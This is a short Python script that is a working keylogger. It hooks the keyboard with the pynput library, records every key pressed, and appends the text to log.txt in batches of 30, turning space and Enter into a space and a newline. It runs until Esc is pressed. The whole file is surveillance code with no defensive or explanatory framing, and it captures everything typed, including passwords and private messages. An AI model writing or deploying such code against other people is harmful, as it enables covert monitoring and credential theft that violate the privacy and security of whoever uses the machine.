import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
	global count, keys
	
	keys.append(key)
	count += 1
	# print('key {0} is pressed'.format(key))

	if count>=30:
		count = 0
		# write into the log.txt the keys list
		write_file(keys)
		keys = []

def write_file(keys):
	# open the text file and append the keys
	with open("log.txt", "a") as f:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") > 0:
			# if space is pressed then ' ' is appended without quotes
				f.write(' ')
			# if enter is pressed then newline line is append
			elif k.find("enter") > 0:
				f.write('\n')
			# else the presse key is appended
			elif k.find("Key") == -1:
				f.write(k)


def on_release(key):
	if key == Key.esc:
		# open("log.txt", "w").close()
        # Stop listener
		return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
